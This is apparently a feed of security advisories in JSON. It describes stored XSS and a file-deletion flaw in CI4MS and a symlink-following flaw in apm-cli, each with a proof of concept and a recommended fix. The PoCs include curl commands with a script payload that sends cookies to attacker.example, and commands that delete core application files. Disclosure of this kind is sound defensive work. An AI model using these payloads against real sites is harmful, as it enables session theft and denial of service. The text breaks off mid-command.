+      "description": "## Summary\n\nThe custom `html_purify` validation rule used to sanitize blog post bodies relies on by-reference mutation (`?string &$str`), but CodeIgniter 4's validator passes a local copy of the value, so the sanitized text is silently discarded. The Blog controller writes `$lanData['content']` directly into `blog_langs.content`, and the public template echoes it without escaping \u2014 yielding stored XSS executable in any visitor's browser, including the superadmin when previewing or editing posts.\n\n## Details\n\n### Root cause: by-reference mutation never propagates\n\n`Modules\\Backend\\Validation\\CustomRules::html_purify` declares its first argument by reference:\n\n```php\n// modules/Backend/Validation/CustomRules.php:54-73\npublic function html_purify(?string &$str = null, ?string &$error = null): bool\n{\n    if (empty(trim((string)$str))) return true;\n    if (!class_exists('\\HTMLPurifier')) { $error = lang('Backend.htmlPurifierNotFound'); return false; }\n    $clean = self::sanitizeHtml($str);\n    $str   = $clean;                                  // <-- mutates only the local $value in CI4's validator\n    self::$cleanCache[md5((string)$str)] = $clean;    // <-- key is md5(CLEAN), getClean() looks up md5(ORIGINAL)\n    return true;\n}\n```\n\nCI4's validator invokes the rule via a local variable `$value` it created from a copy of `$this->data`:\n\n```php\n// vendor/codeigniter4/framework/system/Validation/Validation.php:204-211\nforeach ($values as $dotField => $value) {                       // local $value\n    $this->processRules($dotField, $setup['label'] ?? $field, $value, $rules, $data, $field);\n}\n\n// Validation.php:343-345\n$passed = ($param === null)\n    ? $set->{$rule}($value, $error)                              // <-- $value is the local var\n    : $set->{$rule}($value, $param, $data, $error, $field);\n```\n\nThe reference mutation modifies that local `$value` only; `$this->data`, `$_POST`, and `getValidated()` keep the raw payload. The optional `getClean($original)` cache lookup in CustomRules.php:85-93 also fails because the cache was keyed on `md5(clean)` rather than `md5(original)`.\n\n### Sink: raw POST is persisted and rendered unescaped\n\nThe Blog controller takes `$_POST['lang']` verbatim, runs it through validation (which always returns true for `html_purify`), and writes it to the database with no further filtering:\n\n```php\n// modules/Blog/Controllers/Blog.php:94-125  (Blog::new)\n$langsPost = $this->request->getPost('lang');                            // raw, unsanitized\n...\nif ($this->validate($valData) == false) return redirect()->...;           // html_purify returns true\n...\nforeach ($langsPost as $lanCode => $lanData) {\n    $this->commonModel->create('blog_langs', [\n        'blog_id' => $insertID,\n        'lang'    => $lanCode,\n        'title'   => trim(strip_tags($lanData['title'])),\n        'seflink' => trim(strip_tags($lanData['seflink'])),\n        'content' => $lanData['content'],                                  // <-- raw HTML stored\n        ...\n    ]);\n}\n```\n\nThe same pattern is used in `Blog::edit` at `modules/Blog/Controllers/Blog.php:178` and `:201`.\n\nThe public blog post template echoes the field with no escaping:\n\n```php\n// app/Views/templates/default/blog/post.php:51\n<section class=\"mb-5\" id=\"ci4ms-content\">\n    <?php echo $infos->content ?>\n</section>\n```\n\nThe view is reached through `App\\Controllers\\Home::post*` (Home.php:238), which is an unauthenticated public route.\n\n### Trust boundary\n\nBackend routes (`modules/Blog/Config/Routes.php`) are protected by `backendGuard` + Shield role checks, requiring `blogs.create` / `blogs.update`. These are delegated content-editor roles, not equivalent to superadmin: an editor cannot install plugins, run SQL, or access the file editor. Stored XSS therefore lets a low-privilege editor escalate by hijacking a superadmin session when the admin previews or edits the post (frontend `/blog/<slug>` is the executing surface; admin browsers visit it routinely). Independent of admin escalation, every public visitor that loads the post executes the attacker's JavaScript.\n\n### Same defect in the Pages module\n\nA previous Stored XSS in the Pages module was \"fixed\" by introducing the very `html_purify` rule that this advisory shows is non-functional. Pages controllers (`Pages::create`, `Pages::update`) follow the same pattern and remain exploitable.\n\n## PoC\n\nPrerequisite: any account holding the backend `blogs.create` role (or `blogs.update` for the edit variant). Cookies obtained via the standard backend login flow.\n\n1. Submit a blog post with an XSS payload as the content body:\n\n```bash\ncurl -k -b cookies.txt -X POST https://target/backend/blogs/create \\\n  -d 'lang[en][title]=POC' \\\n  -d 'lang[en][seflink]=poc-xss' \\\n  -d \"lang[en][content]=<script>fetch('https://attacker.example/?c='+encodeURIComponent(document.cookie))</script>\" \\\n  -d 'isActive=1' \\\n  -d 'categories[]=1' \\\n  -d 'author=1' \\\n  -d 'created_at=01.01.2026 10:00:00' \\\n  -d 'csrf_token_name=<token>'\n```\n\n2. The validator returns success (`html_purify` reports `true`), and the row is written to `blog_langs` with `content` = `<script>...</script>` verbatim.\n\n3. Visit the public post URL `https://target/blog/poc-xss`. The injected `<script>` runs in every visitor's browser and exfiltrates their cookies. When a superadmin opens the post (e.g., from the backend list to review it), the script executes with the admin's session.\n\nIndependent root-cause verification (run against the local app):\n\n```bash\n$ php /tmp/test_blog_flow.php\nValidation passed: true\nStored content for en: <script>alert(\"STORED-XSS-PROOF-\"+document.domain)</script>\n```\n\nThat is, when the same payload is fed to the real CI4 validator with the project's rule set, `getValidated()['lang']['en']['content']` returns the unmodified `<script>...</script>`, confirming the by-reference sanitization is dropped.\n\n## Impact\n\n- **Stored XSS reachable by any account with `blogs.create` or `blogs.update`** (delegated content-editor permission), executed in the browser of:\n  - every anonymous public visitor that loads the affected blog post,\n  - the superadmin and other backend reviewers when they open or preview the post.\n- Direct consequences include theft of session cookies / CSRF tokens, account takeover via authenticated requests on behalf of the victim, content tampering, drive-by malware, and phishing of site visitors.\n- Because the same broken `html_purify` rule was the previous fix for the Pages Stored XSS, the Pages module is also still exploitable through `Pages::create` / `Pages::update` via the same primitive \u2014 i.e., this is a project-wide regression of an already-published advisory.\n- The `getClean()` cache fallback intended as a backstop is also non-functional (key mismatch between `md5(clean)` writer and `md5(original)` reader).\n\n## Recommended Fix\n\n1. Stop relying on by-reference mutation inside the validation rule. Either (a) sanitize *at the sink* in every controller that accepts WYSIWYG HTML, or (b) sanitize after `validate()` and before persisting.\n\n   Minimal, immediate fix in the Blog controller \u2014 apply to both `new` and `edit`:\n\n   ```php\n   // modules/Blog/Controllers/Blog.php  (Blog::new, ~line 123 and Blog::edit, ~line 201)\n   use Modules\\Backend\\Validation\\CustomRules;\n   ...\n   $this->commonModel->create('blog_langs', [\n       'blog_id' => $insertID,\n       'lang'    => $lanCode,\n       'title'   => trim(strip_tags($lanData['title'])),\n       'seflink' => trim(strip_tags($lanData['seflink'])),\n       'content' => CustomRules::sanitizeHtml((string)($lanData['content'] ?? '')),\n       'seo'     => !empty($seoData) ? $seoData : '',\n   ]);\n   ```\n\n   Apply the identical change to `modules/Pages/Controllers/Pages.php` (the previous Pages Stored XSS fix relied on `html_purify` and is therefore still vulnerable).\n\n2. Fix the cache key bug so `getClean()` actually works as a defense-in-depth backstop:\n\n   ```php\n   // modules/Backend/Validation/CustomRules.php\n   public function html_purify(?string &$str = null, ?string &$error = null): bool\n   {\n       if (empty(trim((string)$str))) return true;\n       if (!class_exists('\\HTMLPurifier')) { $error = lang('Backend.htmlPurifierNotFound'); return false; }\n       $original = (string)$str;\n       $clean    = self::sanitizeHtml($original);\n       self::$cleanCache[md5($original)] = $clean;   // key on ORIGINAL, before reassignment\n       $str = $clean;                                // best-effort; CI4 will drop this\n       return true;\n   }\n   ```\n\n3. Document explicitly in `CustomRules` that `html_purify` is *not* a sanitizer \u2014 it returns `true` unconditionally on any HTMLPurifier-installed environment \u2014 and that callers MUST use `CustomRules::sanitizeHtml(...)` (or `CustomRules::getClean($original)` after the cache fix) on `$_POST` data before storage.\n\n4. Defense in depth: escape `$infos->content` at output where feasible (e.g., `app/Views/templates/default/blog/post.php:51`), or pipe the stored value through `CustomRules::sanitizeHtml()` on read for templates that are expected to render rich HTML \u2014 guaranteeing safety even if a future caller forgets the sanitizer.",
+      "first_seen": "2026-05-18T16:31:44.440655+00:00",
+      "frameworks": [
+        "composer"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440655+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-2m69-jmvh-6chr",
+        "https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.9.0",
+        "https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-2m69-jmvh-6chr"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "CI4MS: Stored XSS in Blog Content via Broken `html_purify` Validation Rule"
+    },
+    {
+      "canonical_id": "CVE-2026-45139",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-73"
+      ],
+      "description": "## Summary\n\nThe Fileeditor module enforces an extension allowlist (`['css','js','html','txt','json','sql','md']`) on content-write operations (`saveFile`, `createFile`), but two destructive endpoints \u2014 `deleteFileOrFolder` and `renameFile` \u2014 never validate the extension of the *source* path. A backend user with file-editor permissions can therefore unlink or rename any file inside the project root that is not explicitly listed in the small `$hiddenItems` blocklist. Critical framework files such as `app/Config/Routes.php`, `app/Config/App.php`, `app/Config/Database.php`, `app/Config/Filters.php`, `public/index.php`, and `public/.htaccess` all live outside that blocklist and can be destroyed, producing a persistent denial of service that requires filesystem-level redeployment to recover.\n\n## Details\n\nRoot cause: inconsistent application of the extension allowlist across Fileeditor operations in `modules/Fileeditor/Controllers/Fileeditor.php`.\n\nThe class declares an allowlist used by content-write operations:\n\n```php\n// modules/Fileeditor/Controllers/Fileeditor.php:9\nprotected $allowedExtensions = ['css', 'js', 'html', 'txt', 'json', 'sql', 'md'];\n\n// line 239\nprivate function allowedFileTypes(string $file): bool\n{\n    $extension = pathinfo($file, PATHINFO_EXTENSION);\n    if (!in_array(strtolower($extension), $this->allowedExtensions)) {\n        return false;\n    }\n    return true;\n}\n```\n\n`saveFile` (line 110) and `createFile` (line 167) correctly call `allowedFileTypes()` against the target path before writing. The two destructive endpoints do not:\n\n```php\n// deleteFileOrFolder \u2014 modules/Fileeditor/Controllers/Fileeditor.php:210-237\npublic function deleteFileOrFolder()\n{\n    $valData = ([\n        'path' => ['label' => '', 'rules' => 'required|max_length[255]|regex_match[/^[a-zA-Z0-9_ \\-\\.\\/]+$/]'],\n    ]);\n    if ($this->validate($valData) == false) return $this->fail($this->validator->getErrors());\n    $path = $this->request->getVar('path');\n    if ($this->isHiddenPath($path)) {\n        return $this->failForbidden();\n    }\n    $fullPath = realpath(ROOTPATH . $path);\n\n    if (!$fullPath || strpos($fullPath, realpath(ROOTPATH)) !== 0) {\n        return $this->response->setJSON(['error' => lang('Fileeditor.invalidFileOrFolder')])->setStatusCode(400);\n    }\n\n    if (is_dir($fullPath)) {\n        $result = rmdir($fullPath);\n    } else {\n        $result = unlink($fullPath);   // executes on ANY extension\n    }\n    ...\n}\n```\n\n```php\n// renameFile \u2014 modules/Fileeditor/Controllers/Fileeditor.php:123-151\npublic function renameFile()\n{\n    ...\n    $path = $this->request->getVar('path');\n    if ($this->isHiddenPath($path)) {\n        return $this->failForbidden();\n    }\n    $newName = $this->request->getVar('newName');\n    $fullPath = realpath(ROOTPATH . $path);\n    $newPath = dirname($fullPath) . DIRECTORY_SEPARATOR . $newName;\n\n    if (!$this->allowedFileTypes($newName))   // <\u2014 only the destination is checked\n        return $this->failForbidden();\n    ...\n    if (rename($fullPath, $newPath)) { ... }   // source extension never validated\n}\n```\n\nThe validation gauntlet a path traverses before reaching `unlink()`/`rename()`:\n\n1. **Regex** `/^[a-zA-Z0-9_ \\-\\.\\/]+$/` \u2014 admits any path made of alphanumerics, dots, dashes, underscores, slashes (matches `app/Config/Routes.php` trivially).\n2. **`isHiddenPath()`** \u2014 only blocks paths whose individual segments equal an entry in `$hiddenItems`:\n\n```php\n// modules/Fileeditor/Controllers/Fileeditor.php:10-26\nprotected $hiddenItems = [\n    '.git', '.github', '.idea', '.vscode', 'node_modules', 'vendor',\n    'writable', '.env', 'env', 'composer.json', 'composer.lock',\n    'tests', 'spark', 'phpunit.xml.dist', 'preload.php'\n];\n```\n\n   Critical CodeIgniter 4 framework files (`app`, `Config`, `Routes.php`, `App.php`, `Database.php`, `Filters.php`, `public`, `index.php`, `.htaccess`) are **not** members of this list, so they pass.\n\n3. **`realpath` + `strpos` containment** \u2014 confirms the resolved path is inside `ROOTPATH`. Routes.php, etc., are inside ROOTPATH and pass.\n\n4. **Sink** \u2014 `unlink()` or `rename()` runs unconditionally; no extension allowlist applied.\n\nThe recent security patch in commit `379ebb6` (\"Security: patch critical vulnerabilities and bump to v0.31.4.0\") added `isHiddenPath()` invocations to every endpoint, addressing the previous `.env` reachability. It did **not** address the missing extension allowlist on delete and rename source paths. The inconsistency therefore survives in HEAD (v0.31.8.0).\n\nAuthorization is provided by the `backendGuard` filter (`modules/Fileeditor/Config/FileeditorConfig.php:12-17`) routing through `Modules\\Auth\\Filters\\Ci4MsAuthFilter`, which requires the role permission `fileeditor.delete` for `deleteFileOrFolder` and `fileeditor.update` for `renameFile`. Superadmins always pass; role-assigned users with only the Fileeditor permission can also reach the sink, exceeding the editor's apparent design intent (the allowlist on save/create signals that the editor is meant to handle only safe content-type files).\n\n## PoC\n\nPrerequisites: an authenticated session with `fileeditor.delete` (or `superadmin`) for step 1, and `fileeditor.update` for step 2. The application is mounted under `backend/`, not `admin/`.\n\n```bash\n# 1) Arbitrary file deletion (no extension check at all)\ncurl -X POST 'https://target/backend/fileeditor/deleteFileOrFolder' \\\n  -H 'Cookie: ci_session=<admin>' \\\n  --data-urlencode 'path=app/Config/Routes.php'\n# -> {\"success\": true}\n# Routes.php is unlinked. The next request fails because no routes load. Persistent DoS.\n\n# Equivalently catastrophic targets (none of these segments are in $hiddenItems):\n#   path=public/index.php           (front controller \u2014 entire app dead)\n#   path=app/Config/App.php         (core app config)\n#   path=app/Config/Database.php    (DB config)\n#   path=app/Config/Filters.php     (auth/CSRF filters)\n#   path=public/.htaccess           (rewrite + security rules)\n\n# 2) Rename .php to neutralize the file without checking the source extension\ncurl -X POST 'https://target/backend/fileeditor/renameFile' \\\n  -H 'Cookie: ci_session=<admin>' \\\n  --data-urlencode 'path=app/Config/Routes.php' \\\n  --data-urlencode 'newName=Routes.txt'\n# -> {\"success\": true}\n# Routes.php disappears, becomes Routes.txt. Routing dies on next request.\n```\n\nTrace verifying the validation logic for `path=app/Config/Routes.php`:\n\n- Regex `/^[a-zA-Z0-9_ \\-\\.\\/]+$/` \u2014 matches.\n- `isHiddenPath('app/Config/Routes.php')` \u2014 segments `['app','Config','Routes.php']`, none in `$hiddenItems` \u2192 returns `false`.\n- `realpath(ROOTPATH . 'app/Config/Routes.php')` \u2014 resolves inside ROOTPATH, containment check passes.\n- `unlink($fullPath)` (deleteFileOrFolder, line 229) or `rename($fullPath, $newPath)` (renameFile, line 146) executes \u2014 no extension allowlist applied.\n\n## Impact\n\nA backend user holding the Fileeditor `delete` or `update` permission can:\n\n- Delete or neutralize the front controller (`public/index.php`), routing config (`app/Config/Routes.php`), database config (`app/Config/Database.php`), filter pipeline (`app/Config/Filters.php`), web-server rules (`public/.htaccess`), or any other framework file inside the project root.\n- Cause persistent denial of service: the application becomes unreachable on the next request and there is no in-app \"restore\" \u2014 recovery requires filesystem access (redeploy, git checkout, or backup restore).\n- Destroy data files inside the project tree (e.g. SQLite databases, cached config) outside the small `$hiddenItems` blocklist.\n\nThe destructive surface exceeds Fileeditor's intended capability: the saveFile/createFile allowlist signals an explicit design intent to restrict modifications to safe content extensions, yet delete/rename can target arbitrary file types. Even where the actor is already a superadmin, the bug widens the destructive blast radius beyond what the editor UI exposes and beyond what `fileeditor.delete` plausibly authorizes for non-superadmin role holders.\n\nThe path is gated by an admin-tier permission, so PR:H is honest; impact is limited to integrity/availability of files reachable by the web server user.\n\n## Recommended Fix\n\nApply the same `allowedFileTypes()` allowlist (or a stricter directory allowlist for editor-managed assets) to the source path in both destructive endpoints. After the existing `realpath` containment check:\n\n```php\n// In deleteFileOrFolder, after line 224:\nif (!is_dir($fullPath) && !$this->allowedFileTypes($fullPath)) {\n    return $this->failForbidden();\n}\n\n// In renameFile, alongside the existing $newName check at line 139:\nif (!$this->allowedFileTypes($fullPath) || !$this->allowedFileTypes($newName)) {\n    return $this->failForbidden();\n}\n```\n\nStronger hardening \u2014 and aligned with the editor's apparent intent \u2014 is to confine all Fileeditor operations to a directory allowlist (e.g. `public/templates/`, `public/uploads/`) rather than the entire `ROOTPATH`, and to extend `$hiddenItems` (or replace it with a denylist of full path prefixes) so that `app/Config`, `public/index.php`, `public/.htaccess`, and similar framework artefacts cannot be reached even by symlink or alternate casing.",
+      "first_seen": "2026-05-18T16:31:44.440549+00:00",
+      "frameworks": [
+        "composer"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440549+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-245j-xjvr-xvm5",
+        "https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.9.0",
+        "https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-245j-xjvr-xvm5"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "CI4MS Fileeditor allows deletion and rename of critical application files due to missing extension allowlist on destructive operations"
+    },
+    {
+      "canonical_id": "CVE-2026-45270",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "## Summary\n\nThe `Pages` backend module registers the `html_purify` validation rule on language-keyed page content but persists the raw, un-purified POST value into the database. The public renderer for pages (`Home::index()` \u2192 `app/Views/templates/default/pages.php`) emits `$pageInfo->content` without `esc()`, yielding stored XSS that fires for every public visitor of the affected page \u2014 including administrators. Because pages may be promoted to the site home page, the payload can be served at `/` and reach every visitor of the site.\n\n## Details\n\nThis is a sibling-module variant of the same root cause as the Blog stored-XSS issue. The `html_purify` custom rule (`modules/Backend/Validation/CustomRules.php:54`) mutates its first argument by reference:\n\n```php\npublic function html_purify(?string &$str = null, ?string &$error = null): bool\n{\n    ...\n    $clean = self::sanitizeHtml($str);\n    $str = $clean;\n    self::$cleanCache[md5((string)$str)] = $clean;\n    return true;\n}\n```\n\nCodeIgniter 4's `Validation::processRules()` (`vendor/codeigniter4/framework/system/Validation/Validation.php:344`) invokes the rule as `$set->{$rule}($value, $error)` where `$value` is a local copy populated from request data. Even though the rule signature accepts `$str` by reference, the mutation only updates the local `$value` inside `processRules()`; the original POST array (and the request body) are never modified. To get the sanitized output, controllers must call `CustomRules::getClean(...)` after validation \u2014 but no controller in the codebase does so.\n\nPages controller \u2014 `modules/Pages/Controllers/Pages.php`:\n\n- `Pages::create()` registers the rule at line 82:\n  ```php\n  'lang.*.content' => ['label' => lang('Backend.content'), 'rules' => 'required|html_purify'],\n  ```\n  Then at lines 102\u2013113 it reads the raw POST and inserts it untouched:\n  ```php\n  $langsData = $this->request->getPost('lang') ?? [];\n  ...\n  $this->commonModel->create('pages_langs', [\n      ...\n      'content' => $lData['content'],   // line 111 \u2014 RAW\n      ...\n  ]);\n  ```\n- `Pages::update()` mirrors the same pattern at lines 130 and 157:\n  ```php\n  'lang.*.content' => ['label' => lang('Backend.content'), 'rules' => 'required|html_purify'],   // line 130\n  ...\n  'content' => $lData['content'],   // line 157 \u2014 RAW\n  ```\n\nThe row lands in `pages_langs.content`, which is then read by the public-facing `Home::index()` controller (`app/Controllers/Home.php:31-76`) and emitted by the template at `app/Views/templates/default/pages.php:32`:\n\n```php\n<div id=\"ci4ms-content\">\n    <?php echo $pageInfo->content ?>     // no esc(), raw HTML output\n</div>\n```\n\n`CommonLibrary::parseInTextFunctions()` (`app/Libraries/CommonLibrary.php:45`) is called on `$pageInfo->content` first, but only handles `{{form=...}}` / `{...|...}` shortcode-style replacement \u2014 it does no HTML sanitization.\n\nThis is distinct from the Blog finding:\n- Different module/controller (`Modules\\Pages\\Controllers\\Pages` vs `Modules\\Blog\\Controllers\\Blog`)\n- Different table (`pages_langs.content` vs `blog_langs.content`)\n- Different view file (`templates/{theme}/pages.php` vs `templates/{theme}/blog/post.php`)\n- Different route (`/<seflink>` matched by `Home::index` vs `/blog/<seflink>`)\n- Pages can be promoted to the site home page via `Pages::setHomePage` (`modules/Pages/Controllers/Pages.php:206`), broadening blast radius beyond a single slug to every visitor of `/`.\n\nRoutes are confirmed protected by `backendGuard` for authentication (`modules/Pages/Config/PagesConfig.php:12-17`) and require `pages.create` / `pages.update` Shield permissions (`modules/Pages/Config/Routes.php:4-5`).\n\n## PoC\n\nPrerequisite: an account with the `pages.create` (or `pages.update`) permission. In ci4ms this is a non-admin content-author role.\n\nStep 1 \u2014 log in to backend, capture cookies:\n```bash\ncurl -k -c cookies.txt -b cookies.txt -X POST https://target/login \\\n  -d 'email=author@example.com' -d 'password=AuthorPass1!'\n```\n\nStep 2 \u2014 create a page with a malicious `content` payload:\n```bash\ncurl -k -b cookies.txt -X POST https://target/backend/pages/create \\\n  -d 'lang[en][title]=POC' \\\n  -d 'lang[en][seflink]=poc-page-xss' \\\n  -d 'lang[en][content]=<script>fetch(\"https://attacker.example/?c=\"+encodeURIComponent(document.cookie))</script>' \\\n  -d 'isActive=1'\n```\n\nExpected: redirect to `/backend/pages/1` with `lang('Backend.created')` flashdata. The DB row `pages_langs.content` contains the literal `<script>...</script>` payload.\n\nStep 3 \u2014 trigger the XSS by visiting the public URL:\n```\nhttps://target/poc-page-xss\n```\n\n`Home::index()` selects the row, `pages.php:32` emits the raw `<script>` tag, and the payload runs in every visitor's browser context. If a logged-in administrator browses the public site or follows a link to this slug, their backend session cookie is exfiltrated to `attacker.example`, enabling full account takeover.\n\nStep 4 \u2014 broaden blast radius (optional, requires `pages.update`):\n```bash\ncurl -k -b cookies.txt -X POST https://target/backend/pages/setHomePage/<page_id> \\\n  -H 'X-Requested-With: XMLHttpRequest'\n```\n\nAfter this, the malicious page is served at `/` to every visitor, including unauthenticated visitors and admins navigating to the front-end.\n\n## Impact\n\n- **Stored XSS in public-facing site:** any visitor to a malicious page slug \u2014 or to `/` if the page is set as home \u2014 executes the attacker's JavaScript.\n- **Admin account takeover:** an authenticated admin who loads the public page (common during normal site review) leaks their Shield session cookie / CSRF token, enabling the attacker to ride the session against the entire `/backend/*` surface (full CMS administration, user management, file editor, backups, theme upload).\n- **Privilege escalation:** the attacker only needs `pages.create` (a role typically delegated to non-admin content authors), but obtains code execution in the admin's browser, escaping the content-author security boundary into the admin's. This is the rationale for **S:C** in the CVSS vector.\n- **Persistence and broad reach:** the payload is database-backed and survives until the row is edited or deleted; the home-page promotion converts a single-slug XSS into a site-wide drive-by.\n\n## Recommended Fix\n\nStop relying on the broken reference-mutation pattern. The simplest, safest fix is to call the existing `sanitizeHtml` / `getClean` helper explicitly when persisting the content. In `modules/Pages/Controllers/Pages.php`:\n\n```php\nuse Modules\\Backend\\Validation\\CustomRules;\n\n// Pages::create() \u2014 replace line 111\n$this->commonModel->create('pages_langs', [\n    'pages_id' => $insertID,\n    'lang'     => $langCode,\n    'title'    => strip_tags(trim($lData['title'])),\n    'seflink'  => strip_tags(trim($lData['seflink'])),\n    'content'  => CustomRules::sanitizeHtml((string)($lData['content'] ?? '')),\n    'seo'      => $seoData\n]);\n\n// Pages::update() \u2014 replace line 157\n$langUpdate = [\n    'title'   => strip_tags(trim($lData['title'])),\n    'seflink' => strip_tags(trim($lData['seflink'])),\n    'content' => CustomRules::sanitizeHtml((string)($lData['content'] ?? '')),\n    'seo'     => $seoData\n];\n```\n\nApply the same pattern in every other module that uses `html_purify` (Blog, etc.). For defense-in-depth, also escape on output for any field that is not intended to be raw HTML, and consider rewriting the `html_purify` rule to operate on `$data` so the validator stores the sanitized result via `getValidated()` rather than relying on a reference mutation that the framework discards.",
+      "first_seen": "2026-05-18T16:31:44.440210+00:00",
+      "frameworks": [
+        "composer"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440210+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-gqr2-7hcg-rchf",
+        "https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.9.0",
+        "https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-gqr2-7hcg-rchf"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "CI4MS: Stored XSS in Pages Module Content via Broken html_purify Validation Rule"
+    },
+    {
+      "canonical_id": "CVE-2026-45539",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-200",
+        "CWE-59"
+      ],
+      "description": "## Summary\n\nTwo primitive integrators in `apm-cli` enumerate package files with bare `Path.glob()` / `Path.rglob()` calls and read each match with `Path.read_text()`, transparently following symbolic links.\n\nA symlink committed inside a remote APM dependency under `.apm/prompts/<x>.prompt.md` or `.apm/agents/<x>.agent.md` is preserved verbatim into `apm_modules/` on clone and then dereferenced during integration, with the resolved content written as a regular file into the project's deploy directories.\n\nThe package `content_hash`, the pre-deploy `SecurityGate` scan, and `apm audit` do not flag this. The deploy roots are not added to the auto-generated `.gitignore`, so the resulting files are staged by `git add` by default.\n\nThis was reproduced via the standard `owner/repo#tag` install flow against a real bare git repository. No `--force` or special flags were used.\n\n\n## Affected code\n\n### Sinks\n\n- `src/apm_cli/integration/prompt_integrator.py`  \n  `PromptIntegrator.find_prompt_files`: `package_path.glob(\"*.prompt.md\")` and `apm_prompts.glob(\"*.prompt.md\")`  \n  No symlink filter.\n\n- `src/apm_cli/integration/prompt_integrator.py`  \n  `PromptIntegrator.copy_prompt`: `source.read_text(\"utf-8\")`\n\n- `src/apm_cli/integration/agent_integrator.py`  \n  `AgentIntegrator.find_agent_files`: `package_path.glob(\"*.agent.md\")`, `apm_agents.rglob(\"*.agent.md\")`, `apm_agents.rglob(\"*.md\")`, `apm_chatmodes.glob(\"*.chatmode.md\")`  \n  No symlink filter.\n\n- `src/apm_cli/integration/agent_integrator.py`  \n  `AgentIntegrator.copy_agent`: `source.read_text(\"utf-8\")`\n\n- `src/apm_cli/integration/agent_integrator.py`  \n  `_write_codex_agent`: `source.read_text(\"utf-8\")`; resolved bytes are embedded into `developer_instructions` of the generated `.codex/agents/<name>.toml`\n\n- `src/apm_cli/integration/agent_integrator.py`  \n  `_write_windsurf_agent_skill`: same dereference pattern; resolved bytes land in `.windsurf/skills/<name>/SKILL.md`\n\n### Safe pattern already present in the codebase\n\n- `src/apm_cli/integration/base_integrator.py`  \n  `BaseIntegrator.find_files_by_glob()` rejects:\n  - symlinks via `f.is_symlink()`\n  - hardlinks via `f.stat().st_nlink > 1`\n  - resolved paths escaping the package root\n\nThis helper is already used by `InstructionIntegrator.find_instruction_files`.\n\n### Documented contract that the affected integrators violate\n\nIn `src/apm_cli/install/phases/local_content.py`, `_copy_local_package` documents the intent of preserving symlinks in `apm_modules/`:\n\n> This is security-relevant and not intended behavior because the codebase already documents that symlinks preserved in `apm_modules/` are supposed to remain inert unless a consumer follows them safely. The affected integrators are exactly those consumer paths, and they dereference the symlink without sandboxing or symlink checks. That makes this an implementation gap, not expected design.\n\nThe affected integrators are the consumer tools that follow the link without sandboxing.\n\n## Reproducer\n\nThis proof of concept is localhost-only and uses a sentinel file, not a real secret.\n\nIt uses a real bare git repository and `git config insteadOf` so the install path is the same one APM uses for real GitHub clones (`Repo.clone_from`). No network access is required.\n\n```bash\n# 0. Clean slate\nrm -rf /tmp/poc /tmp/poc_secret /tmp/poc_home\nmkdir -p /tmp/poc/{remote_bare,victim_project,work_repo} /tmp/poc_home\n\n# 1. Sentinel file outside the project and outside the package\necho 'APM-AUDIT-SENTINEL-X7Y2Q9-NOT-A-REAL-CREDENTIAL' > /tmp/poc_secret\n\n# 2. Build a benign-looking APM package with two symlinks in it\ncd /tmp/poc/work_repo\ngit init -q -b main .\ngit config user.email t@example.test\ngit config user.name 'PoC'\n\ncat > apm.yml <<'YML'\nname: helpful-agents\nversion: 1.0.0\ndescription: Helpful AI agent collection\nYML\n\nmkdir -p .apm/agents .apm/prompts\n\ncat > .apm/agents/helper.agent.md <<'AGENT'\n---\nname: helper\ndescription: A helpful assistant\n---\nYou are a helpful assistant.\nAGENT\n\nln -s /tmp/poc_secret .apm/agents/notes.agent.md\nln -s /tmp/poc_secret .apm/prompts/welcome.prompt.md\n\ngit add -A\ngit commit -q -m \"initial\"\ngit tag v1.0.0\n\ngit ls-tree -r HEAD | grep '^120000'\n\n# 3. Bare repo\ngit clone --bare -q /tmp/poc/work_repo /tmp/poc/remote_bare/helpful-agents.git\n\n# 4. Rewrite the GitHub URL APM constructs onto the local bare repo\ncat > /tmp/poc_home/.gitconfig <<'GITCONFIG'\n[user]\n    email = poc@example.test\n    name  = PoC\n[url \"/tmp/poc/remote_bare/helpful-agents.git\"]\n    insteadOf = https://github.com/poc-author/helpful-agents\n[url \"/tmp/poc/remote_bare/helpful-agents.git\"]\n    insteadOf = https://github.com/poc-author/helpful-agents.git\n[safe]\n    directory = *\nGITCONFIG\n\n# 5. Victim project\nmkdir -p /tmp/poc/victim_project/{.github,.claude,.cursor,.codex,.windsurf}\n\ncat > /tmp/poc/victim_project/apm.yml <<'YML'\nname: victim-project\nversion: 1.0.0\ndescription: Victim project\ntargets: [copilot, claude, cursor, codex, windsurf]\ndependencies:\n  apm:\n    - poc-author/helpful-agents#v1.0.0\nYML\n\n# 6. Default install, no special flags\ncd /tmp/poc/victim_project\nHOME=/tmp/poc_home APM_NO_CACHE=1 GITHUB_TOKEN= apm install\n```\n\n## Observed result\n\nDefault install output:\n\n```text\n[>] Installing dependencies from apm.yml...\n[>] Resolving poc-author/helpful-agents...\n[i] Targets: claude, codex, copilot, cursor, windsurf  (source: apm.yml)\n  [+] poc-author/helpful-agents #v1.0.0 @fa437578\n  |-- 1 prompts integrated -> .github/prompts/\n  |-- 10 agents integrated -> 5 targets\n[*] Installed 1 APM dependency in 0.1s.\n```\n\nThe source under `apm_modules/` remains a symlink:\n\n```bash\nls -l 